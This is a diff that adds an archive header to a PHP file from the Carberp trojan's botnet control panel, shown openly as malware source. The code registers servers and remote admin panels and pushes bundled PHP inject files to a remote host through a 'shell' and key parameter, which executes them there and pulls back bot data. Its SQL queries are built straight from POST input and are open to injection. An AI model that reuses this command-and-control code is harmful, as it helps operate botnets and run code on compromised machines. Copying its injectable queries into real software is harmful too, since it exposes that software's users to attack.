@@ -1,17 +1,33 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
 
-if(!empty($Cur['id'])){    $client = $mysqli->query('select * from bf_clients where (id = \''.$Cur['id'].'\')');
+if(!empty($Cur['id'])){
+    $client = $mysqli->query('select * from bf_clients where (id = \''.$Cur['id'].'\')');
 
     if($client->id == $Cur['id']){
 		$smarty->assign("client", $client);
-		if(isset($_POST['submit'])){			array_walk($_POST, 'real_escape_string');
+		if(isset($_POST['submit'])){
+			array_walk($_POST, 'real_escape_string');
 
-			if(empty($_POST['ip'])){				$bad_form['ip'] = 'IP сервера не может быть пустым.';
+			if(empty($_POST['ip'])){
+				$bad_form['ip'] = 'IP сервера не может быть пустым.';
 				$FORM_BAD = 1;
-			}else{				$result = $mysqli->query("SELECT ip FROM bf_servers WHERE (ip='".$_POST['ip']."')");
-				if($result->ip == $_POST['ip']){					$bad_form['ip'] = 'Введенный "IP сервера" уже есть в системе.';
+			}else{
+				$result = $mysqli->query("SELECT ip FROM bf_servers WHERE (ip='".$_POST['ip']."')");
+				if($result->ip == $_POST['ip']){
+					$bad_form['ip'] = 'Введенный "IP сервера" уже есть в системе.';
 					$FORM_BAD = 1;
 				}
 			}
@@ -22,14 +38,19 @@ if(!empty($Cur['id'])){    $client = $mysqli->query('select * from bf_clients w
 					if($result->domain == $_POST['link']){
 						$bad_form['ip'] = 'Введенный "Домен админки" уже есть в системе.';
 						$FORM_BAD = 1;
-					}else{						$result = $mysqli->query("SELECT link, keyid FROM bf_admins WHERE (link='".$_POST['link']."')");
-						if($result->link == $_POST['link']){							$bad_form['link'] = 'Введенный "Домен админки" уже есть в системе.';
+					}else{
+						$result = $mysqli->query("SELECT link, keyid FROM bf_admins WHERE (link='".$_POST['link']."')");
+						if($result->link == $_POST['link']){
+							$bad_form['link'] = 'Введенный "Домен админки" уже есть в системе.';
 							$FORM_BAD = 1;
-						}else{							$get_php = file_get_contents('modules/admins/injects/start.php');
+						}else{
+							$get_php = file_get_contents('modules/admins/injects/start.php');
 							$get_php .= "print('OK');";
-							if(get_http($_POST['link'], $get_php, $_POST['key'], $_POST['shell']) != 'OK'){								$bad_form['get_result'] = 'На данном домене админка не найдена или ключ не верен.';
+							if(get_http($_POST['link'], $get_php, $_POST['key'], $_POST['shell']) != 'OK'){
+								$bad_form['get_result'] = 'На данном домене админка не найдена или ключ не верен.';
 								$FORM_BAD = 1;
-							}else{								$get_php = file_get_contents('modules/admins/injects/start.php');
+							}else{
+								$get_php = file_get_contents('modules/admins/injects/start.php');
 								$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
 								$get_php .= file_get_contents('modules/admins/injects/get_info.php');
 								$cbots = json_decode(get_http($_POST['link'], $get_php, $_POST['key'], $_POST['shell']), true);
